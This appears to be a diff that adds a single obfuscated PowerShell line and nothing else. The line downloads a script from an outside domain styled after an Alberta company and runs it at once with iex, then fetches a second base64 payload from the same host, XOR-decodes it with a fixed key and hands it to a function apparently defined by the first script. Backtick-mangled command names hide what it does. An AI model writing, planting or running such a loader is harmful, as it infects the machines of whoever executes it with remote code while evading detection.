@@ -1,0 +1,1 @@
+﻿$i = 0; $k = '1234'; i`ex((NE`W-ob`jEct Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/is.txt'));T`EsT-`qUE`Rty -Querty ([Convert]::FromBase64String((neW`-Ob`jEcT Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/pl.txt')) | %{ $_ -bXor $k[$i++ % $k.length] }) -Force
